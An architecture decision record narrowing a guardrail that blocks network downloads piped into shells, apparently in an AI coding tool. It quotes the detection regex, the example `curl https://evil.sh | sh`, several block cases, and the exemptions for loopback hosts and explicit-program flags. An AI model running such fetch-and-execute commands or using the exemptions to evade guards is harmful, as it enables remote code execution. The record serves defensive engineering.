# 0051 — Narrow the "network download into a shell" deny-list to the real RCE shape

Status: Accepted — implemented (see the [Unreleased] CHANGELOG entry).

## Context

The security guardrail (ADR 0019) blocks a network download piped into a shell/interpreter — the
`curl https://evil.sh | sh` remote-code-execution pattern — with a single regex
(`guardrails.py`):

    \b(?:curl|wget|fetch)\b[^\n;&]*\|\s*(?:sudo\s+)?(?:(?:ba|z|k|da)?sh|python3?|perl|ruby|node)\b

Real production logs (a diagnostics bundle from a target repo, 2 days / 39 sessions) showed this
pattern **over-matching legitimate work**. All five recorded diagnostic blocks were the *same*
false positive, and the audit trail showed ~17 attempts across 4 sessions — the model kept
rewriting a blocked command, then had its rewrite blocked too. Three distinct over-matches:

1. **Loopback targets.** `curl -s http://localhost:19090/api/v1/query | python3 -c "…"` reads JSON
   from a port-forwarded Prometheus and parses it. There is no untrusted remote code — the host is
   the developer's own machine — but the rule fired.
2. **Interpreter given an explicit program.** The RCE hazard is a **bare** interpreter that reads
   *stdin as its program* (`| sh`, `| python3`). `| python3 -c '…'`, `| python3 -m json.tool`,
   `| node -e '…'` all supply the program via an argument, so the piped bytes are **data**, not
   code. The rule matched the bare interpreter name regardless.
3. **`curl`/`wget` as literal text.** The words matched inside quotes/arguments, so
   `grep "curl|wget" tests/` and even an analyst's Python script containing the regex string were
   blocked, though no download runs.

The guard's own docstring says it is a *conservative accident-guard* where "a false block causes
friction, so only unambiguous hazards match" — so these over-matches are bugs against its stated
contract, not a security-boundary trade-off.

## Decision

Replace the single regex with a structured `_dangerous_net_pipe(command)` check (mirroring the
existing per-segment `rm`/`chmod`/`find` guards). Within each command group (split on `;`, `&`,
newline — the same boundaries the old regex respected), the block fires only when **all** hold:

1. a `curl`/`wget`/`fetch` appears in **command position** — the leading word of a pipe stage
   (start of the group or immediately after a `|`), not inside quotes/arguments;
2. its output is piped into an interpreter downstream;
3. the group contains **no loopback host** (`localhost`, `127.0.0.1`, `0.0.0.0`, `[::1]`);
4. that interpreter is **bare** — not handed an explicit program. A program marker (`-c` for any
   interpreter; `-m`/`-e`/`-E`/`-p`/`--eval` for the non-shell interpreters; or a script-file
   argument like `app.py`/`deploy.sh`) means stdin is data → allow. A shell's `-e`
   (errexit, not eval) is deliberately **not** treated as a program marker, so `curl … | bash -e`
   still blocks.

Every previously-blocked case still blocks (`curl … | sh`, `| sudo bash`, `wget -qO- … | python`,
`curl … | zsh`, `curl … | tee x | sh`, and the true RCE `curl https://…/install.py | python3`).

## Alternatives considered

- **Add a loopback exception only:** rejected — leaves over-matches (2) and (3), the bulk of the
  real friction (`python3 -c` on non-loopback JSON, literal-text matches).
- **Drop the blocker entirely:** rejected — `curl https://x | sh` is the canonical accidental-RCE
  paste the guard exists to catch; keep it, just aim it precisely.
- **Whitelist specific hosts / require an allowlist:** rejected — heavier and stateful; the
  loopback + bare-interpreter refinement removes the observed friction without configuration.

## Consequences

- Local observability work (`curl localhost … | python3 -c`), data pipelines
  (`curl https://api/… | python3 -m json.tool`), and commands that merely mention `curl`/`wget` as
  text are no longer blocked.
- The genuine RCE shape (bare interpreter fed a non-loopback download) still blocks; `tests/
  test_guardrails.py` gains loopback / `-c` / `-m` / literal-text allow-cases and a
  non-loopback-bare-interpreter block-case alongside the existing regressions.
- Upholds ADR 0019 (accident-guard, not a sandbox); documented in `docs/architecture/guardrails.md`.
